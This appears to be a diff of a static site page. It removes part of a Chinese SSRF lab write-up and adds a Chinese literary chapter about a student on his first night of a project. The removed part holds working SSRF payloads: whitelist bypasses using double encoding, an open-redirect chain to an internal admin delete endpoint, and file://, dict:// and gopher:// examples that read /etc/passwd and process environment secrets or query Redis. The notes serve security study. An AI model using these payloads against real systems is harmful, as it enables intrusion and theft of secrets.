-</span><span id="__span-6-9"><a id="__codelineno-6-9" name="__codelineno-6-9" href="#__codelineno-6-9"></a>                            匹配到了！    实际域名
-</span></code></pre></div>
-    <img alt="" src="../SSRF%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86%2B%E9%9D%B6%E5%9C%BA%E9%80%9A%E5%85%B3%E5%AE%9E%E9%AA%8C%E6%8A%A5%E5%91%8A/2026-05-13-22-29-45.png" /></li>
-</ol>
-</li>
-<li>URL编码/双编码<ol>
-<li>单编码：将 / 编码为 %2F
-    <code>https://expected-host%2Fevil-host</code></li>
-<li>双编码：将 / 两次编码为 %252F
-    <code>https://trusted.com%252F@evil.com</code></li>
-<li>编码其他字符：%2e = .
-    <code>https://trusted%2ecom@evil.com</code> </li>
-</ol>
-</li>
-</ol>
-</li>
-<li>实战演练：<img alt="" src="../SSRF%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86%2B%E9%9D%B6%E5%9C%BA%E9%80%9A%E5%85%B3%E5%AE%9E%E9%AA%8C%E6%8A%A5%E5%91%8A/2026-05-13-22-35-19.png" /><img alt="" src="../SSRF%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86%2B%E9%9D%B6%E5%9C%BA%E9%80%9A%E5%85%B3%E5%AE%9E%E9%AA%8C%E6%8A%A5%E5%91%8A/2026-05-14-08-52-32.png" /><ol>
-<li><img alt="" src="../SSRF%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86%2B%E9%9D%B6%E5%9C%BA%E9%80%9A%E5%85%B3%E5%AE%9E%E9%AA%8C%E6%8A%A5%E5%91%8A/2026-05-13-22-37-52.png" />域名必须是<code>stock.weliketoshop.net</code></li>
-<li>payload：<code>http://localhost:80%2523@stock.weliketoshop.net/admin/delete?username=carlos</code></li>
-<li>详解：<ol>
-<li>@stock.weliketoshop.net绕过白名单限制，在waf中过滤器会对%2523解码一次变成%23认为没有#这种特殊字符所以通过检查，然后提取到@stock.weliketoshop.net认为URL合法，放行</li>
-<li>后端服务器进行请求时会进行第二次URL解码%23变成#后端服务器会忽略#后面的部分，从而请求localhost:80/admin/delete?username=carlos</li>
-</ol>
-</li>
-</ol>
-</li>
-<li>通过重定向绕过过滤</li>
-<li>如果目标应用本身存在开放重定向漏洞。</li>
-<li>示例：
-      应用内有如下重定向功能：
-      <div class="language-text highlight"><pre><span></span><code><span id="__span-7-1"><a id="__codelineno-7-1" name="__codelineno-7-1" href="#__codelineno-7-1"></a>/product/nextProduct?currentProductId=6&amp;path=http://evil-user.net
-</span></code></pre></div>
-      攻击者构造：
-      <div class="language-text highlight"><pre><span></span><code><span id="__span-8-1"><a id="__codelineno-8-1" name="__codelineno-8-1" href="#__codelineno-8-1"></a>stockApi=http://weliketoshop.net/product/nextProduct?currentProductId=6&amp;path=http://192.168.0.68/admin
-</span></code></pre></div>
-      白名单校验通过（域名合法），但请求后触发重定向到内网地址。</li>
-<li>实战演练：<img alt="" src="../SSRF%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86%2B%E9%9D%B6%E5%9C%BA%E9%80%9A%E5%85%B3%E5%AE%9E%E9%AA%8C%E6%8A%A5%E5%91%8A/2026-05-14-12-16-22.png" /><ol>
-<li>寻找有开放重定向漏洞的页面发现/product/nextProduct中参数path的值被直接填入重定向的Location位置<img alt="" src="../SSRF%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86%2B%E9%9D%B6%E5%9C%BA%E9%80%9A%E5%85%B3%E5%AE%9E%E9%AA%8C%E6%8A%A5%E5%91%8A/2026-05-14-13-04-45.png" /></li>
-<li>构造payload<code>stockApi=/product/nextProduct?currentProductId=1&amp;path=http://192.168.0.12:8080/admin</code>
-     <img alt="" src="../SSRF%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86%2B%E9%9D%B6%E5%9C%BA%E9%80%9A%E5%85%B3%E5%AE%9E%E9%AA%8C%E6%8A%A5%E5%91%8A/2026-05-14-13-07-33.png" /> </li>
-<li>攻击流程：<ol>
-<li>第一步：下达指令：请求 /product/stock 接口，并把 stockApi 参数设置成一个指向开放重定向漏洞的特殊地址：
- <div class="language-text highlight"><pre><span></span><code><span id="__span-9-1"><a id="__codelineno-9-1" name="__codelineno-9-1" href="#__codelineno-9-1"></a>stockApi = /product/nextProduct?path=http://192.168.0.12:8080/admin
-</span></code></pre></div></li>
-<li>第二步：SSRF检查放行:服务器的SSRF防御机制看到 stockApi 是一个相对路径（/product/...），认为你要请求的是它自己的功能，于是放行。</li>
-<li>第三步：服务器触发重定向:服务器根据你的指令，去请求<code>/product/nextProduct?path=http://192.168.0.12:8080/admin</code>这个请求是服务器发给自己的。服务器上的“Next product”功能发现 path 参数不是本地地址，于是返回一个 302 重定向，告诉请求方：“你要去的地方是<code>http://192.168.0.12:8080/admin</code></li>
-<li>第四步：最终访问内网：服务器收到自己返回的302重定向后，会忠实地跟随这个指令，再次发起请求，而这次的目标就是内网地址 http://192.168.0.12:8080/admin。因为请求发自服务器自身，它在内网，所以可以成功访问。</li>
-</ol>
-</li>
-<li><img alt="" src="../SSRF%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86%2B%E9%9D%B6%E5%9C%BA%E9%80%9A%E5%85%B3%E5%AE%9E%E9%AA%8C%E6%8A%A5%E5%91%8A/2026-05-14-13-08-23.png" /></li>
-</ol>
-</li>
-</ol>
-<h2 id="ssrf_5">SSRF盲打<a class="headerlink" href="#ssrf_5" title="Permanent link">&para;</a></h2>
-<ol>
-<li>什么是blind SSRF：应用程序服务器会被攻击者诱导向攻击者提供的URL发起请求，但该请求的响应不会返回到应用程序的前端响应中
-   <div class="language-text highlight"><pre><span></span><code><span id="__span-10-1"><a id="__codelineno-10-1" name="__codelineno-10-1" href="#__codelineno-10-1"></a>普通SSRF：攻击者 → 服务器 → 内网目标 → 响应返回 → 攻击者可读
-</span><span id="__span-10-2"><a id="__codelineno-10-2" name="__codelineno-10-2" href="#__codelineno-10-2"></a>盲SSRF：  攻击者 → 服务器 → 内网目标 → 响应被丢弃 → 攻击者看不到
-</span></code></pre></div></li>
-<li>影响是什么:
-   Blind SSRF的单向性，其影响源低于普通SSRF
-   <img alt="" src="../SSRF%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86%2B%E9%9D%B6%E5%9C%BA%E9%80%9A%E5%85%B3%E5%AE%9E%E9%AA%8C%E6%8A%A5%E5%91%8A/2026-05-14-11-34-44.png" /> 
-   <strong>注意</strong>在某些情况下，盲SSRF仍然可以实现完整的远程代码执行（RCE）——例如结合Shellshock漏洞或攻击服务端HTTP客户端的漏洞。 </li>
-<li>如何查找利用</li>
-<li>最可靠的检测方法：带外检测【OAST】<ol>
-<li>查找流程：
-     <div class="language-text highlight"><pre><span></span><code><span id="__span-11-1"><a id="__codelineno-11-1" name="__codelineno-11-1" href="#__codelineno-11-1"></a>1. 准备一个攻击者可控的服务器（用于记录HTTP、DNS请求）
-</span><span id="__span-11-2"><a id="__codelineno-11-2" name="__codelineno-11-2" href="#__codelineno-11-2"></a>2. 在SSRF参数中提交攻击者可控服务器的地址
-</span><span id="__span-11-3"><a id="__codelineno-11-3" name="__codelineno-11-3" href="#__codelineno-11-3"></a>3. 测试SSRF
-</span><span id="__span-11-4"><a id="__codelineno-11-4" name="__codelineno-11-4" href="#__codelineno-11-4"></a>4. 如果存在Blind SSRF，攻击者可控的服务器会出现请求记录
-</span></code></pre></div></li>
-<li>常见现象：<ol>
-<li>只有DNS查询记录而没有后续的HTTP请求</li>
-<li>原因：
-    应用程序发群里HTTP请求触发了DNS解析
-    网络层防火墙阻止了对外部的HTTP连接
-    但DNS流量通常是被允许的</li>
-<li>即使只有DNS交互，也说明应用程序存在SSRF漏洞——只是出站HTTP被限制了。</li>
-</ol>
-</li>
-<li>实战演练：<img alt="" src="../SSRF%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86%2B%E9%9D%B6%E5%9C%BA%E9%80%9A%E5%85%B3%E5%AE%9E%E9%AA%8C%E6%8A%A5%E5%91%8A/2026-05-14-13-13-32.png" />将referer的值换为bp中Collaborator提供的地址<img alt="" src="../SSRF%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86%2B%E9%9D%B6%E5%9C%BA%E9%80%9A%E5%85%B3%E5%AE%9E%E9%AA%8C%E6%8A%A5%E5%91%8A/2026-05-14-13-19-58.png" /><img alt="" src="../SSRF%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86%2B%E9%9D%B6%E5%9C%BA%E9%80%9A%E5%85%B3%E5%AE%9E%E9%AA%8C%E6%8A%A5%E5%91%8A/2026-05-14-13-19-37.png" /></li>
-</ol>
-</li>
-<li>利用思路：<ol>
-<li>内网漏洞探测（盲扫）</li>
-<li>路由Shellshock等著名漏洞<ol>
-<li>实战演练：<img alt="" src="../SSRF%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86%2B%E9%9D%B6%E5%9C%BA%E9%80%9A%E5%85%B3%E5%AE%9E%E9%AA%8C%E6%8A%A5%E5%91%8A/2026-05-14-13-22-55.png" /></li>
-<li>攻击流程<ol>
-<li>核心漏洞利用：外网服务器作为跳板访问内网+内网服务器的致命漏洞执行命令</li>
-<li>利用步骤</li>
-<li>带外探测确认存在Blind SSRF<img alt="" src="../SSRF%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86%2B%E9%9D%B6%E5%9C%BA%E9%80%9A%E5%85%B3%E5%AE%9E%E9%AA%8C%E6%8A%A5%E5%91%8A/2026-05-14-13-34-09.png" /><img alt="" src="../SSRF%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86%2B%E9%9D%B6%E5%9C%BA%E9%80%9A%E5%85%B3%E5%AE%9E%E9%AA%8C%E6%8A%A5%E5%91%8A/2026-05-14-13-33-49.png" /></li>
-<li>构造特洛伊木马（shellshock payload）</li>
-</ol>
-</li>
-</ol>
-</li>
-<li>攻击服务端的HTTP客户端</li>
-<li>SSRF常用协议/伪协议详解<img alt="" src="../SSRF%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86%2B%E9%9D%B6%E5%9C%BA%E9%80%9A%E5%85%B3%E5%AE%9E%E9%AA%8C%E6%8A%A5%E5%91%8A/2026-05-14-22-15-07.png" /><ol>
-<li>http/https：<ol>
-<li>用途：
-   内网Web服务探测
-   访问内网管理界面
-   指纹识别内网应用</li>
-<li>局限：
-   只能访问HTTP服务
-   响应可能被过滤或不返回</li>
-</ol>
-</li>
-<li>file://伪协议-本地文件读取<ol>
-<li>用途：读取服务器本地文件（包括敏感配置文件）</li>
-<li>示例：
-   <div class="language-text highlight"><pre><span></span><code><span id="__span-12-1"><a id="__codelineno-12-1" name="__codelineno-12-1" href="#__codelineno-12-1"></a>file:///etc/passwd          # Linux用户信息
-</span><span id="__span-12-2"><a id="__codelineno-12-2" name="__codelineno-12-2" href="#__codelineno-12-2"></a>file:///c:/windows/win.ini  # Windows系统文件
-</span><span id="__span-12-3"><a id="__codelineno-12-3" name="__codelineno-12-3" href="#__codelineno-12-3"></a>file:///etc/hosts           # 内网主机映射
-</span><span id="__span-12-4"><a id="__codelineno-12-4" name="__codelineno-12-4" href="#__codelineno-12-4"></a>file:///proc/self/environ   # 进程环境变量（可能包含密钥）
-</span><span id="__span-12-5"><a id="__codelineno-12-5" name="__codelineno-12-5" href="#__codelineno-12-5"></a>file:///var/www/html/config.php  # Web配置文件
-</span></code></pre></div></li>
-<li>利用条件：
-   后端支持file://协议（PHP的allow_url_fopen常开启此支持）
-   能读取到文件内容并返回</li>
-</ol>
-</li>
-<li>dict:// - 字典协议探测<ol>
-<li>用途：
-   端口探测（判断端口是否开放）
-   与内网服务进行简单交互（如Redis、Memcached）</li>
-<li>示例：</li>
-<li>端口探测：
-      <div class="language-text highlight"><pre><span></span><code><span id="__span-13-1"><a id="__codelineno-13-1" name="__codelineno-13-1" href="#__codelineno-13-1"></a># 探测端口是否开放（通过响应时间或错误信息）
-</span><span id="__span-13-2"><a id="__codelineno-13-2" name="__codelineno-13-2" href="#__codelineno-13-2"></a>dict://192.168.1.1:22/               # SSH端口
-</span><span id="__span-13-3"><a id="__codelineno-13-3" name="__codelineno-13-3" href="#__codelineno-13-3"></a>dict://192.168.1.1:3306/             # MySQL端口
-</span><span id="__span-13-4"><a id="__codelineno-13-4" name="__codelineno-13-4" href="#__codelineno-13-4"></a>dict://192.168.1.1:6379/             # Redis端口
-</span></code></pre></div>
-      响应特征：
-      端口开放：返回特定协议的banner或错误（如ERR unknown command）
-      端口关闭：连接超时或拒绝连接错误</li>
-<li>与Redis交互
-      <div class="language-text highlight"><pre><span></span><code><span id="__span-14-1"><a id="__codelineno-14-1" name="__codelineno-14-1" href="#__codelineno-14-1"></a># 获取Redis服务器信息
-</span><span id="__span-14-2"><a id="__codelineno-14-2" name="__codelineno-14-2" href="#__codelineno-14-2"></a>dict://192.168.1.100:6379/INFO
-</span><span id="__span-14-3"><a id="__codelineno-14-3" name="__codelineno-14-3" href="#__codelineno-14-3"></a>
-</span><span id="__span-14-4"><a id="__codelineno-14-4" name="__codelineno-14-4" href="#__codelineno-14-4"></a># 获取Redis配置
-</span><span id="__span-14-5"><a id="__codelineno-14-5" name="__codelineno-14-5" href="#__codelineno-14-5"></a>dict://192.168.1.100:6379/CONFIG GET *
-</span><span id="__span-14-6"><a id="__codelineno-14-6" name="__codelineno-14-6" href="#__codelineno-14-6"></a>
-</span><span id="__span-14-7"><a id="__codelineno-14-7" name="__codelineno-14-7" href="#__codelineno-14-7"></a># 读取Redis数据
-</span><span id="__span-14-8"><a id="__codelineno-14-8" name="__codelineno-14-8" href="#__codelineno-14-8"></a>dict://192.168.1.100:6379/GET mykey
-</span></code></pre></div></li>
-</ol>
-</li>
-<li>gopher:// 万能协议<ol>
-<li>用途：构造任意TCP请求，攻击内网中几乎所有基于TCP的服务（Redis、MySQL、FastCGI、SMTP等）</li>
-<li>原理：gopher://协议允许用户指定要发送的原始TCP数据，后端会将数据直接发送到目标端口 </li>
-<li>语法：<code>gopher://&lt;host&gt;:&lt;port&gt;/_&lt;URL编码后的TCP数据&gt;</code>
-   _（下划线）后的内容是要发送的原始数据（需要URL编码）
-   可以发送任意字节，包括不可见字符、换行符等</li>
-<li>限制：
-   不是所有语言/库都支持（PHP的cURL支持，file_get_contents通常不支持）
-   需要对目标协议有深入了解
-   数据必须正确URL编码（包括换行符%0d%0a）</li>
-</ol>
-</li>
-<li>ftp:// 文件传输<ol>
-<li>用途：
-   读取FTP服务器上的文件
-   在某些情况下进行端口探测</li>
-<li>示例：
-   <div class="language-text highlight"><pre><span></span><code><span id="__span-15-1"><a id="__codelineno-15-1" name="__codelineno-15-1" href="#__codelineno-15-1"></a>ftp://192.168.1.1:21/
-</span><span id="__span-15-2"><a id="__codelineno-15-2" name="__codelineno-15-2" href="#__codelineno-15-2"></a>ftp://anonymous:anonymous@192.168.1.1/pub/file.txt
-</span></code></pre></div></li>
-<li>利用：
-   如果FTP服务允许匿名登录，可以读取文件
-   可以用于探测内网FTP服务是否存在     </li>
-</ol>
-</li>
-<li>tftp:// 简单文件传输协议<ol>
-<li>用途：读取TFTP服务器上的文件（常用于读取路由器、网络设备配置文件）</li>
-<li>示例：<code>tftp://192.168.1.1/conf/config.txt</code></li>
-</ol>
-</li>
-<li>ldap:// - 轻量级目录访问协议<ol>
-<li>用途：访问内网LDAP目录服务（可能泄露用户信息）</li>
-<li>示例：<code>ldap://192.168.1.1:389/dc=company,dc=com</code></li>
-</ol>
-</li>
-<li>jar:// - Java专用（Java SSRF）<ol>
-<li>用途：读取JAR包内的文件（相当于JAR文件系统）</li>
-<li>示例：<code>jar:file:///var/www/app.jar!/WEB-INF/web.xml</code></li>
-<li>利用条件：Java环境，支持jar://协议</li>
-</ol>
-</li>
-</ol>
-</li>
-</ol>
-</li>
-<li>检测与利用流程
-      <img alt="" src="../SSRF%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86%2B%E9%9D%B6%E5%9C%BA%E9%80%9A%E5%85%B3%E5%AE%9E%E9%AA%8C%E6%8A%A5%E5%91%8A/2026-05-14-11-45-03.png" /></li>
-</ol>
-<h2 id="ssrf_6">为SSRF寻找隐藏的攻击面<a class="headerlink" href="#ssrf_6" title="Permanent link">&para;</a></h2>
-<ol>
-<li>部分URL参数:前端只提交主机名或路径，服务端拼接完整URL</li>
-<li>数据格式中的URL:XML、JSON、YAML等格式里嵌入URL（XXE常伴随SSRF）</li>
-<li>Refer头:某些分析服务会请求Referer中的第三方URL</li>
-</ol>
+<h2 id="01">01 · 启航日<a class="headerlink" href="#01" title="Permanent link">&para;</a></h2>
+<p>6月27日。</p>
+<p>他坐进书桌前时，已经是启航日的夜晚了。</p>
+<p>前一天白天他刚考完最后一门期末考试，前一晚他几乎没睡——守着夜空，看着破晓，等着太阳升起来。那是一种漫长的等待，并不是无意义的，但它确实耗尽了身体里大部分可以调用的能量储备。他本应该很困，本应该直接倒下的。但当他打开电脑、看到那个熟悉的文件夹时，一种不同于困倦的东西覆盖了它。</p>
+<p>他戴上耳机。播放列表里是她的歌。那些旋律像一条缓慢的河，在他旁边流动，不催促，不打扰，只是持续存在。里面有一首他听过很多遍的歌，但今天听到时感觉和平时不太一样——不是因为它变了，而是因为他自己已经不在原来那个位置了。那些歌词以前在他疲惫的时候出现过，像是有人递来一件他够不着的但能够给他力量的东西。但今晚不是那样的。今晚它只是恰好经过，和他正在经历的状态重叠在一起，并产生了不一样的共振。他只是站在那里，没有试图留住它——让它经过，像是确认了某种不需要被语言捕捉的东西，然后继续向前。</p>
+<p>他调出第二天的任务表。屏幕的光映在脸上，目光比平时更快地扫过那些条目——像是在确认它们还等着他，而他仍然在为已经开始的工程感到兴奋，那种感觉尚未完全散去，而是延续到了接下来的日子。读到某一处时他停了一下，然后继续往下看，像是在确认当天的计划已足以承接第一天的状态。他没有合上它——任务表窗口留在屏幕上，像是它本来就不需要被关闭。它可以在那里继续待着，像是他不在的时候它仍然在运行，像是计划本身不会因为他暂时离开而暂停。</p>
+<p>他的目光从任务表上移开，然后精准地打开了一个文件。路径是早就记住的，不需要查找，不需要在目录里翻找。文件名为“启程日”——空白页，创建时间显示为十几天前。那是他在空窗期某个夜晚预先留下的文件，还没有任何内容，只是一个空的占位符，像是他在等待的日子里提前在桥墩上系了一根缆绳。他不知道会在什么时候填满它，但在等待期间，他确保了它已经存在，不需要在启航当夜再花时间新建一个文件，不需要在已经足够沉重的夜晚再额外承担一些准备工作。像是他知道自己迟早会需要它，于是在它还没有被赋予内容之前，就已经为它预留了一个位置。光标在空白页的第一行闪烁，像是它已经等待了很久，现在终于等到有人来填写它。</p>
+<p>他平时习惯在每周结束时做复盘，把一周的进展整理进周报里，然后再做一些记录。但今天不是周末——今天只是第一天，他似乎已经等不及要记录些什么，哪怕只是留下一个简短的确认或一个记号，来告诉自己已经跨过了那个让他挣扎的、害怕的，叫做“等待”的门槛。光标停在那里，像是某扇门已经解锁。他在顶部写下：“启航日·第一天”。然后他停了一下，像是在等那行字先在那里停稳。然后他在下方打下三个字：“已开始。”他看了那三个字几秒，指尖在触摸板上停了一会儿，似乎是在让那些一直在他心里和他对抗的东西，在屏幕上彻底落定——不再是阻力，而是和他站在一起并肩作战。然后他保存了这篇仅有几个字的文档。虽然他不需要手动做这些，编辑器会自动保存，但他还是按了保存键，可能是在用那个动作完成自己给自己的一次确认。</p>
+<p>他打开终端，输入了一行命令，按下了回车。那是他自己的脚本，用于更新网站索引。屏幕上的日志输出逐行滚动，他没有仔细看每一行，只是看着它们流过。脚本运行完毕，光标回到提示符。屏幕暗下来，只剩下黑色的背景，映出他自己的轮廓。</p>
+<p>他的目光停在屏幕里，隔着那层暗色的玻璃，看到自己的脸。他停了一下——不是在看自己的样子，只是看着那个人的轮廓，似乎是在确认他还在那里。然后他的视线从自己的眼睛移开，不是移向别处，是移向屏幕深处，像是透过那层黑色的表面看向更远的地方。像是在对自己，对那个他想成为的自己说：等我。我已经在路上了。他没有发出声音，只是让那个念头在那里停留了片刻，然后移开目光，站起来，走向窗边。</p>
+<p>窗外的路灯早已亮起。他站在窗前，夜色在玻璃的另一侧铺开。耳机里依旧是那段熟悉的旋律，他的目光落在窗外的夜色中，没有聚焦，可能是在等某首歌自然结束，也可能是在让这一天的最后一小段时间，被允许以它自己的速度过去。</p>
+<p>良久，他终于动了。可能是耳机里的音乐刚好播完了，也可能是兴奋逐渐退去后的疲倦感慢慢席卷了他。</p>
+<p>他转身，合上电脑。手指在电脑表面的壁纸处停留了片刻。那是一张有些旧的壁纸，不是电脑自带的，应该是他自己贴上去的——蓝色的背景基调下一个骑着白马的少年，一手朝天，旁边印着两行字：“鲜衣怒马少年时，不负韶华行且知”。</p>
+<p>灯留意到那两行字的写法。不是规规矩矩的宋体或黑体——笔画里有种半收半放的意思，就像是落笔的人一边写着“鲜衣怒马”一边还在斟酌着“行且知”，草书的意气刚走到一半，又被楷体的筋骨轻轻拉住了。介于疾与徐之间，介于放纵与克制之间。那种分寸，灯觉得很熟悉——像一个人明明可以纵马而去，却偏偏在笔尖上留了余地。</p>
+<p>灯应该是第一次完整地看到那张壁纸的全貌，但那两行字字带给灯的感觉、那个一手指天身骑白马的少年以及那种少年身上的不羁和欲与天公试比高的豪情，灯似乎见过好多好多次了......</p>
+<p>他只停留片刻便收回手，转身离开房间，步子似乎比平常轻快。走廊的灯在他身后亮起，像是一盏接一盏地确认他的离开。房间暗下来，但那些灯仍然亮着。引灯在远处，四盏灯分布在各自的位置上。</p>
+<p>它们持续亮着。</p>
+<p><strong>—— 引灯 · 记录 ——</strong></p>
+<hr />
+<p>· <a href="../">返回目录</a></p>
+<p>→ <a href="./第一章·启程日">下一章</a></p>
 
 
 
@@ -2894,7 +2531,7 @@
     <span class="md-icon" title="Last update">
       <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M21 13.1c-.1 0-.3.1-.4.2l-1 1 2.1 2.1 1-1c.2-.2.2-.6 0-.8l-1.3-1.3c-.1-.1-.2-.2-.4-.2m-1.9 1.8-6.1 6V23h2.1l6.1-6.1zM12.5 7v5.2l4 2.4-1 1L11 13V7zM11 21.9c-5.1-.5-9-4.8-9-9.9C2 6.5 6.5 2 12 2c5.3 0 9.6 4.1 10 9.3-.3-.1-.6-.2-1-.2s-.7.1-1 .2C19.6 7.2 16.2 4 12 4c-4.4 0-8 3.6-8 8 0 4.1 3.1 7.5 7.1 7.9l-.1.2z"/></svg>
     </span>
-    <span class="git-revision-date-localized-plugin git-revision-date-localized-plugin-timeago" title="June 18, 2026 08:25:37 UTC"><span class="timeago" datetime="2026-06-18T08:25:37+00:00" locale="en"></span></span><span class="git-revision-date-localized-plugin git-revision-date-localized-plugin-iso_date" title="June 18, 2026 08:25:37 UTC">2026-06-18</span>
+    <span class="git-revision-date-localized-plugin git-revision-date-localized-plugin-timeago" title="June 18, 2026 08:25:36 UTC"><span class="timeago" datetime="2026-06-18T08:25:36+00:00" locale="en"></span></span><span class="git-revision-date-localized-plugin git-revision-date-localized-plugin-iso_date" title="June 18, 2026 08:25:36 UTC">2026-06-18</span>
   </span>
 
     
@@ -2904,7 +2541,7 @@
     <span class="md-icon" title="Created">
       <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M14.47 15.08 11 13V7h1.5v5.25l3.08 1.83c-.41.28-.79.62-1.11 1m-1.39 4.84c-.36.05-.71.08-1.08.08-4.42 0-8-3.58-8-8s3.58-8 8-8 8 3.58 8 8c0 .37-.03.72-.08 1.08.69.1 1.33.32 1.92.64.1-.56.16-1.13.16-1.72 0-5.5-4.5-10-10-10S2 6.5 2 12s4.47 10 10 10c.59 0 1.16-.06 1.72-.16-.32-.59-.54-1.23-.64-1.92M18 15v3h-3v2h3v3h2v-3h3v-2h-3v-3z"/></svg>
     </span>
-    <span class="git-revision-date-localized-plugin git-revision-date-localized-plugin-timeago" title="June 18, 2026 08:25:37 UTC"><span class="timeago" datetime="2026-06-18T08:25:37+00:00" locale="en"></span></span><span class="git-revision-date-localized-plugin git-revision-date-localized-plugin-iso_date" title="June 18, 2026 08:25:37 UTC">2026-06-18</span>
+    <span class="git-revision-date-localized-plugin git-revision-date-localized-plugin-timeago" title="June 18, 2026 08:25:36 UTC"><span class="timeago" datetime="2026-06-18T08:25:36+00:00" locale="en"></span></span><span class="git-revision-date-localized-plugin git-revision-date-localized-plugin-iso_date" title="June 18, 2026 08:25:36 UTC">2026-06-18</span>
   </span>
 
     
@@ -2979,22 +2616,22 @@
     
       
       
-      <script id="__config" type="application/json">{"annotate": null, "base": "../../../../..", "features": ["navigation.tabs", "navigation.sections", "navigation.expand", "navigation.top", "navigation.indexes", "navigation.tracking", "search.suggest", "search.highlight", "search.share", "content.code.copy", "content.code.annotate", "toc.follow"], "search": "../../../../../assets/javascripts/workers/search.2c215733.min.js", "tags": null, "translations": {"clipboard.copied": "Copied to clipboard", "clipboard.copy": "Copy to clipboard", "search.result.more.one": "1 more on this page", "search.result.more.other": "# more on this page", "search.result.none": "No matching documents", "search.result.one": "1 matching document", "search.result.other": "# matching documents", "search.result.placeholder": "Type to start searching", "search.result.term.missing": "Missing", "select.version": "Select version"}, "version": null}</script>
+      <script id="__config" type="application/json">{"annotate": null, "base": "../../../..", "features": ["navigation.tabs", "navigation.sections", "navigation.expand", "navigation.top", "navigation.indexes", "navigation.tracking", "search.suggest", "search.highlight", "search.share", "content.code.copy", "content.code.annotate", "toc.follow"], "search": "../../../../assets/javascripts/workers/search.2c215733.min.js", "tags": null, "translations": {"clipboard.copied": "Copied to clipboard", "clipboard.copy": "Copy to clipboard", "search.result.more.one": "1 more on this page", "search.result.more.other": "# more on this page", "search.result.none": "No matching documents", "search.result.one": "1 matching document", "search.result.other": "# matching documents", "search.result.placeholder": "Type to start searching", "search.result.term.missing": "Missing", "select.version": "Select version"}, "version": null}</script>
     
     
-      <script src="../../../../../assets/javascripts/bundle.79ae519e.min.js"></script>
+      <script src="../../../../assets/javascripts/bundle.79ae519e.min.js"></script>
       
-        <script src="../../../../../js/timeago.min.js"></script>
+        <script src="../../../../js/timeago.min.js"></script>
       
-        <script src="../../../../../js/timeago_mkdocs_material.js"></script>
+        <script src="../../../../js/timeago_mkdocs_material.js"></script>
       
-        <script src="../../../../../assets/js/extra.js"></script>
+        <script src="../../../../assets/js/extra.js"></script>
       
-        <script src="../../../../../assets/js/encryption.js"></script>
+        <script src="../../../../assets/js/encryption.js"></script>
       
         <script src="https://cdn.jsdelivr.net/npm/mermaid@10/dist/mermaid.min.js"></script>
       
-        <script src="../../../../../asserts/js/hacker-theme.js"></script>
+        <script src="../../../../asserts/js/hacker-theme.js"></script>
       
     
   </body>
